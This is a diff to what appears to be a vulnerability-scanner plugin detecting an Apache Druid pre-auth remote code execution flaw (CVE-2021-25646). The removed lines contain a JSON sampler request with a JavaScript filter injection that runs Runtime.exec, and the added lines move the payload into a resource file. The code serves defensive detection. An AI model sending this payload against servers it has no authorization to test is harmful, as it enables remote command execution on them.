@@ -3,9 +3,11 @@ package com.google.tsunami.plugins.detectors.rce.cve202125646;
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
+import static java.nio.charset.StandardCharsets.UTF_8;
 
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.common.io.Resources;
 import com.google.common.net.MediaType;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
@@ -50,10 +52,20 @@ public class ApacheDruidPreAuthRCECVE202125646VulnDetector implements VulnDetect
   private final Clock utcClock;
   private final HttpClient httpClient;
 
+  private final String payloadString;
+
   @Inject
   ApacheDruidPreAuthRCECVE202125646VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient);
+    String payloadString;
+    try {
+      payloadString = Resources.toString(
+          Resources.getResource(this.getClass(), "payloadString.json"), UTF_8);
+    } catch (IOException e) {
+      throw new AssertionError("Couldn't load payload resource file.", e);
+    }
+    this.payloadString = payloadString;
   }
 
   @Override
@@ -74,42 +86,19 @@ public class ApacheDruidPreAuthRCECVE202125646VulnDetector implements VulnDetect
         .addHeader(com.google.common.net.HttpHeaders.CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
         .build();
 
-    String payload = "{\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", "
-        + "\"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,"
-        + "\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\","
-        + "\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\","
-        + "\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,"
-        + "\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\","
-        + "\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,"
-        + "\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\","
-        + "\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, "
-        + "\"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, "
-        + "\"dataSchema\": {\"dataSource\": \"sample\", "
-        + "\"timestampSpec\": {\"column\": \"timestamp\", "
-        + "\"format\": \"iso\"}, \"dimensionsSpec\": {}, "
-        + "\"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", "
-        + "\"dimension\": \"added\", \"function\": \"function(value) {%s}\", "
-        + "\"\": {\"enabled\": true}}}}, \"type\": \"index\", "
-        + "\"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, "
-        + "\"timeoutMs\": 15000}}";
-    ByteString normalBody = ByteString.copyFromUtf8(
-        String.format(payload, ""));
+    ByteString requestBody = ByteString.copyFromUtf8(payloadString);
     String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
         + "druid/indexer/v1/sampler";
     try {
       HttpResponse response = httpClient.send(
-          post(targetUri).setHeaders(httpHeaders).setRequestBody(normalBody).build(),
+          post(targetUri).setHeaders(httpHeaders).setRequestBody(requestBody).build(),
           networkService);
-      if (response.status() == HttpStatus.OK && response.bodyString().isPresent()
-          && response.bodyString().get()
-          .equals("{\"numRowsRead\":0,\"numRowsIndexed\":0,\"data\":[]}")) {
-        ByteString errorBody = ByteString.copyFromUtf8(
-            String.format(payload, "java.lang.Runtime.getRuntime().exec('error_cmd')"));
-        response = httpClient.send(
-            post(targetUri).setHeaders(httpHeaders).setRequestBody(errorBody).build(),
-            networkService);
-        if (response.status() == HttpStatus.OK && response.bodyString().isPresent()
-            && response.bodyString().get().contains("Failed to sample data")) {
+      if (response.status() == HttpStatus.OK && response.bodyString().isPresent()) {
+        String responseBody = response.bodyString().get();
+        if (responseBody.equals("{\"error\":\"Failed to sample data: JavaScript is disabled\"}")) {
+          return false;
+        }
+        if (responseBody.equals("{\"numRowsRead\":0,\"numRowsIndexed\":0,\"data\":[]}")) {
           return true;
         }
       }
